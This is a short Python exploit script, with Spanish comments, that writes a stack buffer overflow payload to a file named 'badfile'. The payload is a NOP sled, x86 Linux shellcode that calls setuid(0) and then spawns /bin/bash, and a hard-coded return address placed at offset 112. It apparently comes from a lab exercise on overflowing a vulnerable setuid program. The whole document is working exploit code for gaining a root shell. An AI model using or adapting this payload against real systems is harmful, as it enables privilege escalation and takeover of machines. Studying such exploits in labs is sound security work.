#!/usr/bin/python3
shellcode= (
"\x31\xc0"  
"\x31\xdb" 
"\xb0\xd5" 
"\xcd\x80" 
"\x31\xc0" 
"\x50" 
"\x68""bash" 
"\x68""////"  
"\x68""/bin" 
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1')

#tama√±o del bufer ydesplazamiento
file_size=300

#colchon de nops 
content = bytearray(0x90 for i in range(file_size)) 


start = file_size - len(shellcode)
content[start:] = shellcode  #<-- el shell code va al final, despues de los nops es lo que se ejecuta 

print("[+] shellcode ", start, " bytes")

#direccion de retorno
ebp_offset = 108
return_addr_offset = ebp_offset + 4 #desplazamiento
addr_ebp = 0xbffff098


ret = addr_ebp + 116


content[return_addr_offset:return_addr_offset+4] = (ret).to_bytes(4, byteorder='little') # salto a la direccion 

#write
with open('badfile', 'wb') as f:
    f.write(content)
